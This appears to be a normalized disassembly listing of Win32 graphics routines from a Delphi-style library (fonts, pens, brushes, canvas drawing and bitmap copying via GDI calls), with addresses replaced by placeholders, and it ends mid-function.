mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4042b4
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407da4
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_41dcb0
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_41db74
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_41d730
mov edx esp
mov eax ebx
call sub_41d968
add esp 0x2c
pop esi
pop ebx
retn
sub_41dba0
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41d950
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41d968
add esp 0x2c
pop esi
pop ebx
retn
sub_41dbe0
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41d950
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402ca4
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_4042ec
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402b94
mov edx esp
mov eax ebx
call sub_41d968
sub_41dc58
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_41dba0
pop esi
pop ebx
retn
sub_41dc84
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41d950
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41d968
add esp 0x30
pop ebx
retn
sub_41dcb8
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41d950
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_41d968
add esp 0x2c
pop esi
pop ebx
retn
sub_41dce8
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41d950
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_41d968
add esp 0x2c
pop esi
pop ebx
retn
sub_41dd10
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41cd28
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_41dd54
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41ce0c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_41dd7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41476c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d53c
xor eax eax
push ebp
push sub_41de1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41d53c
xor eax eax
push ebp
push sub_41ddfe
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41cf34
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41df64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41de05
mov eax [ ebp - 0x8 ]
call sub_41d54c
retn
sub_41de34
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41de4c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41d53c
xor eax eax
push ebp
push sub_41de91
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41cebc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41de98
mov eax [ ebp - 0x4 ]
call sub_41d54c
retn
sub_41dea4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41de34
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41de4c
add esp 0x10
pop esi
pop ebx
retn
sub_41decc
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41cd10
xor eax eax
push ebp
push sub_41df52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41cd1c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41d4f8
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_41df80
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41de34
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_41de4c
add esp 0x10
pop esi
pop ebx
retn
sub_41dfb0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41de34
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_41de4c
sub_41dfdc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41cd28
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_41e01c
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41ce0c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_41e044
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41476c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d53c
xor eax eax
push ebp
push sub_41e0d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41d53c
xor eax eax
push ebp
push sub_41e0b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41cf34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e0be
mov eax [ ebp - 0x8 ]
call sub_41d54c
retn
sub_41e0ec
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_41e108
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41d53c
xor eax eax
push ebp
push sub_41e14d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41cebc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e154
mov eax [ ebp - 0x4 ]
call sub_41d54c
retn
sub_41e158
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_41e108
add esp 0x10
pop edi
pop esi
retn
sub_41e184
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41e0ec
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_41e108
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_41e1b8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41cd10
xor edx edx
push ebp
push sub_41e285
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41cd1c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41d4f8
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_41e2a0
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41e0ec
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_41e108
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_41e2d4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403264
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d7e4
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41eb4c
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dd10
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41eb6c
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dfdc
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41eb8c
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_4144ac
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_41e398
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_414548
xor edx edx
mov eax esi
call sub_41e984
mov eax [ esi + 0xc ]
call sub_403294
mov eax [ esi + 0x10 ]
call sub_403294
mov eax [ esi + 0x14 ]
call sub_403294
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414740
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_41e3f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e9d8
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41e9d8
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41e47c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e9d8
mov eax [ ebx + 0x14 ]
call sub_41e17c
call sub_41d4f8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41d4f8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_412d08
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41e528
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e9d8
mov eax [ ebx + 0x14 ]
call sub_41e1b8
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41e564
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e9d8
mov eax [ ebx + 0x14 ]
call sub_41e1b8
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41e5a0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e9d8
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41e600
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41e9d8
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_41e62c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e9d8
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41e668
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_41e904
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_41e694
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e9d8
mov eax ebx
call sub_41e668
cmp al 0x1
jne r-xdata
push 0x0
mov eax esi
call sub_404310
push eax
mov eax esi
call sub_404510
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx esi
mov eax ebx
call sub_41e764
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41e600
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx esi
mov eax ebx
call sub_41e764
inc eax
add edi eax
sub_41e720
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41e9d8
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_404310
push eax
mov eax edi
call sub_404510
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_41e764
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41e720
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41e780
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41e720
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41e7a0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41e7ec
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e7f3
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_41e5d8
sub_41e84c
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41e9d8
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_41e870
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_41e600
pop ecx
pop edx
pop edi
pop esi
retn
sub_41e890
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41e9d8
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_41e8bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e9d8
mov eax [ ebp + 0x8 ]
call sub_41d4f8
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41e924
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_41e984
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_41e924
mov edx esp
mov eax ebx
call sub_41e84c
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_41e870
sub_41e9d8
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_41ea74
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
test bl 0x8
je r-xdata
mov eax esi
call sub_41eaa0
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_41ead0
sub_41ea74
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_41d9cc
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41d4f8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_41eaa0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41decc
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_41ead0
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_41e1b8
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_41e1b8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_41e298
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_41e17c
call sub_41d4f8
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_41e17c
call sub_41d4f8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_41ebf4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41ec3e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec45
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_41ec48
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_41ece4
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_41ebf4
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_4042c0
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eceb
lea eax [ ebp - 0x104 ]
call sub_404050
retn
sub_41ed00
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_41ee4e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_41edbd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_41ec48
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_41ec48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ee55
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
